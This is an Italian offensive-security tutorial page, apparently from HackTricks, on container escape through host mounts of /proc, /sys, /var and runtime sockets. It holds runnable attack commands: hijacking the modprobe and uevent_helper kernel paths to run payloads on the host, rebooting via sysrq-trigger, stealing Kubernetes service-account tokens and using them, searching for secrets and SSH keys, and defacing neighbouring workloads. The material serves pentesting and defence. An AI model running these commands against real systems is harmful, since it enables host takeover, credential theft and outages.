# Montaggi host sensibili

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Host mounts sono una delle superfici pratiche più importanti per container-escape perché spesso comprimono una vista di processo accuratamente isolata rendendola nuovamente visibile direttamente alle risorse dell'host. I casi pericolosi non si limitano a `/`. Bind mounts di `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, o percorsi relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container vicini e interfacce di gestione runtime.

Questa pagina esiste separatamente dalle singole pagine di protezione perché il modello di abuso è trasversale. Una mount host scrivibile è pericolosa in parte a causa dei mount namespaces, in parte a causa degli user namespaces, in parte a causa della copertura di AppArmor o SELinux, e in parte a seconda del percorso host esatto esposto. Trattarlo come un argomento a sé rende la superficie di attacco molto più facile da analizzare.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone voci proc scrivibili inaspettate può quindi portare a divulgazione di informazioni, denial of service, o esecuzione diretta di codice sull'host.

Percorsi procfs di alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Inizia controllando quali voci procfs di alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi percorsi sono interessanti per ragioni diverse. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare vettori di host code-execution quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di ricognizione per lo sviluppo di exploit del kernel. `sched_debug` e `mountinfo` rivelano il contesto di processi, cgroup e filesystem che può aiutare a ricostruire la disposizione dell'host dall'interno del container.

Il valore pratico di ciascun percorso è diverso, e trattarli tutti come se avessero lo stesso impatto rende il triage più difficile:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei percorsi procfs ad alto impatto perché il kernel eseguirà un pipe handler dopo un crash. Un container che può puntare `core_pattern` verso un payload memorizzato nel suo overlay o in un percorso host montato può spesso ottenere host code execution. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo percorso controlla l'helper userspace usato dal kernel quando deve invocare la logica di caricamento dei moduli. Se è scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro primitive di host code-execution. È particolarmente interessante quando combinato con un modo per attivare il percorso dell'helper.
- `/proc/sys/vm/panic_on_oom`
Questo di solito non è un escape primitive pulito, ma può convertire la pressione di memoria in un denial-of-service a livello host trasformando condizioni OOM in comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere esecuzione in contesto host quando un file corrispondente viene eseguito.
- `/proc/config.gz`
Utile per il triage di exploit del kernel. Aiuta a determinare quali sottosistemi, mitigazioni e funzionalità opzionali del kernel sono abilitate senza richiedere i metadata dei pacchetti dell'host.
- `/proc/sysrq-trigger`
Principalmente un percorso di denial-of-service, ma molto serio. Può riavviare, causare panic o altrimenti interrompere immediatamente l'host.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Utile per host fingerprinting, analisi dei crash e, in alcuni ambienti, per leaking di informazioni utili allo sviluppo di exploit del kernel.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
Questo è un'interfaccia diretta alla memoria di processo. Se il processo bersaglio è raggiungibile con le condizioni ptrace-style necessarie, può permettere la lettura o la modifica della memoria di un altro processo. L'impatto realistico dipende fortemente da credenziali, `hidepid`, Yama e restrizioni ptrace, quindi è un percorso potente ma condizionale.
- `/proc/kcore`
Espone una vista in stile core-image della memoria di sistema. Il file è enorme e scomodo da usare, ma se è leggibile in modo significativo indica una superficie di memoria host esposta in modo grave.
- `/proc/kmem` and `/proc/mem`
Interfacce di memoria raw storicamente ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente limitate, ma se presenti e utilizzabili dovrebbero essere considerate finding critici.
- `/proc/sched_debug`
Leaks informazioni di scheduling e sui task che possono esporre le identità dei processi host anche quando altre viste dei processi sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove il container risiede realmente sull'host, quali percorsi sono backed da overlay e se un mount scrivibile corrisponde a contenuto host o solo al layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il percorso host del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diversi trucchi di esecuzione sull'host richiedono di convertire un percorso interno al container nel corrispondente percorso dal punto di vista dell'host.

### Esempio completo: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il helper path viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dall'obiettivo e dal comportamento del kernel, ma il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione dell'helper del kernel verso contenuto del percorso host controllato dall'attaccante.

### Esempio completo: Kernel Recon con `kallsyms`, `kmsg`, e `config.gz`

Se l'obiettivo è la valutazione della sfruttabilità piuttosto che l'evasione immediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a determinare se informazioni utili sui simboli sono visibili, se messaggi recenti del kernel rivelano uno stato interessante e quali funzionalità o mitigazioni del kernel sono compilate. L'impatto di solito non è un escape diretto, ma può ridurre drasticamente il triage delle vulnerabilità del kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è il riavvio immediato dell'host. Questo non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più seria della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei dispositivi. Alcuni percorsi di sysfs sono principalmente utili per fingerprinting, mentre altri possono influenzare l'esecuzione di helper, il comportamento dei dispositivi, la configurazione dei moduli di sicurezza o lo stato del firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono rilevanti per motivi diversi. `/sys/class/thermal` può influenzare il comportamento della gestione termica e quindi la stabilità dell'host in ambienti mal esposti. `/sys/kernel/vmcoreinfo` può leak informazioni sul crash-dump e sulla struttura del kernel che aiutano il fingerprinting dell'host a basso livello. `/sys/kernel/security` è l'interfaccia `securityfs` usata dai Linux Security Modules, quindi un accesso inaspettato lì può esporre o alterare lo stato relativo a MAC. I percorsi delle variabili EFI possono influenzare le impostazioni di boot supportate dal firmware, rendendoli molto più seri dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia rivolta agli sviluppatori con aspettative di sicurezza molto inferiori rispetto alle API del kernel rinforzate e rivolte alla produzione.

Comandi utili per esaminare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un'altra LSM sono visibili in modo che avrebbero dovuto restare esclusivi dell'host.
- `/sys/kernel/debug` è spesso la scoperta più allarmante di questo gruppo. Se `debugfs` è montato e leggibile o scrivibile, aspettati una vasta superficie rivolta al kernel il cui rischio preciso dipende dai nodi di debug abilitati.
- L'esposizione delle variabili EFI è meno comune, ma se presente ha alto impatto perché interessa impostazioni gestite dal firmware anziché i normali file di runtime.
- `/sys/class/thermal` riguarda principalmente la stabilità dell'host e l'interazione hardware, non per un'evasione in stile shell.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per host-fingerprinting e analisi dei crash, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può eseguire un helper controllato dall'attaccante quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui questo funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host anziché all'interno del container corrente.

## Esposizione di `/var`

Montare il `/var` dell'host in un container è spesso sottovalutato perché non appare così drammatico come montare `/`. In pratica può essere sufficiente per raggiungere socket di runtime, directory di snapshot dei container, volumi dei pod gestiti da kubelet, projected service-account tokens e filesystem delle applicazioni vicine. Su nodi moderni, `/var` è spesso il luogo in cui risiede lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i projected tokens di altri pod e il contenuto degli snapshot dell'overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché indicano se il mount espone solo dati applicativi banali o credenziali del cluster ad alto impatto. Un service-account token leggibile può trasformare immediatamente local code execution in accesso all'API di Kubernetes.

Se il token è presente, verifica cosa può raggiungere invece di fermarti alla sola scoperta del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto qui può essere molto più ampio rispetto all'accesso al nodo locale. Un token con ampi privilegi RBAC può trasformare un mount di `/var` in una compromissione dell'intero cluster.

### Esempio Docker e containerd

Sui host Docker i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi sotto `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il mount di `/var` espone contenuti di snapshot scrivibili di un altro workload, l'attaccante potrebbe essere in grado di modificare file dell'applicazione, impiantare contenuti web o cambiare startup scripts senza toccare la configurazione dell'attuale container.

Idee concrete di abuso una volta trovato contenuto di snapshot scrivibile:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto di `/var` montato: manomissione dell'applicazione, recupero di segreti e movimento laterale verso workload adiacenti.

## Socket di runtime

Gli mount sensibili dell'host spesso includono socket di runtime piuttosto che directory complete. Questi sono così importanti che meritano una ripetizione esplicita qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi di sfruttamento completi una volta che una di queste socket è montata.

Come rapido schema di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste va a buon fine, il percorso da "mounted socket" a "start a more privileged sibling container" è di solito molto più breve rispetto a qualsiasi path di kernel breakout.

## CVE legate ai mount

I host mounts intersecano anche le runtime vulnerabilities. Esempi recenti importanti includono:

- `CVE-2024-21626` in `runc`, dove un leaked directory file descriptor potrebbe posizionare la working directory sul filesystem host.
- `CVE-2024-23651` e `CVE-2024-23653` in BuildKit, dove OverlayFS copy-up races potrebbero produrre host-path writes durante i build.
- `CVE-2024-1753` in Buildah and Podman build flows, dove crafted bind mounts durante il build potrebbero esporre `/` in read-write.
- `CVE-2024-40635` in containerd, dove un grande valore `User` potrebbe overfloware in comportamento UID 0.

Queste CVE sono importanti qui perché mostrano che la gestione dei mount non riguarda solo la configurazione dell'operatore. Il runtime stesso può anche introdurre condizioni di escape guidate dai mount.

## Checks

Usa questi comandi per individuare rapidamente le esposizioni di mount di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Root dell'host, `/proc`, `/sys`, `/var` e socket di runtime sono tutte scoperte ad alta priorità.
- Le voci scrivibili in proc/sys spesso indicano che il mount sta esponendo controlli del kernel a livello host anziché una vista sicura del container.
- I percorsi montati in `/var` meritano una revisione delle credenziali e dei carichi di lavoro adiacenti, non solo del filesystem.
